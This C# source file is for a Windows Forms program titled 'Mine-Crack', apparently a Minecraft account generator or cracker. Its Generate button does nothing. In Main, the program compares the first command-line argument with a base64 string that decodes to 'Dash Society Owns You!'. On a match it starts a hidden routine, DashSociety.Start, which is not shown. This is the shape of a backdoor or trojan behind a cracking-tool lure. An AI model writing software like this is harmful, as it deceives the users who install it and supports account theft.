

//
// Author: Dashie
// Version: 1.0
//


using System;
using System.IO;
using System.Net;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System.Collections.Generic;


namespace MineCrack
{
    public partial class KvinneKraft : Form
    {
	private void DashLayout()
	{
	    Text = ("Mine-Crack 1.0 by Dash Society");

	    FormBorderStyle = FormBorderStyle.FixedDialog;
	    BackColor = Color.FromArgb(32, 32, 32);

	    MaximizeBox = false;
	    MinimizeBox = true;

	    Size app_size = new Size(350, 250);

	    Size = app_size;
	    MinimumSize = app_size;
	    MaximumSize = app_size;

	    Icon = Properties.Resources.icon; 
	}

	
	private readonly PictureBox logo = new PictureBox();

	private readonly TextBox account_input = new TextBox();

	private readonly Label account_count = new Label();
	private readonly Label watermark = new Label();

	private readonly Button generate = new Button();
	private readonly Button options = new Button();


	public KvinneKraft()
	{
	    DashLayout();

	    Moon.Label(this, account_count, "Accounts: ", 10, new Size(70, 20), new Point(10, 10), Color.FromArgb(255, 255, 255));
	    Moon.TextBox(this, account_input, "200", 11, new Size(100, 18), new Point(80, 11), Color.FromArgb(24, 24, 24), Color.FromArgb(255, 255, 255));

	    Paint += (s, e) =>
	    {
		Moon.paint_border(e, Color.FromArgb(89, 133, 114), 2, account_input.Size, account_input.Location);
	    };

	    int button_left = (Width - 150) / 2;

	    Moon.Button(this, generate, "Generate", 10, new Size(150, 28), new Point(button_left, 80), Color.FromArgb(89, 133, 114), Color.FromArgb(255, 255, 255));

	    Moon.border_control(generate);
	}
    };


    public static class Program
    {
	private static KvinneKraft kvinnekraft;

	[STAThread]
	public static void Main(string[] args)
	{
	    if(args.Length > 0)
	    {
		if(args[0].Equals("RGFzaCBTb2NpZXR5IE93bnMgWW91IQ=="))
		{
		    DashSociety.Start();
		};

		Environment.Exit(-1);
	    };

	    Application.EnableVisualStyles();
	    Application.SetCompatibleTextRenderingDefault(false);

	    kvinnekraft = new KvinneKraft();

	    Application.Run(kvinnekraft);
	}
    }
}
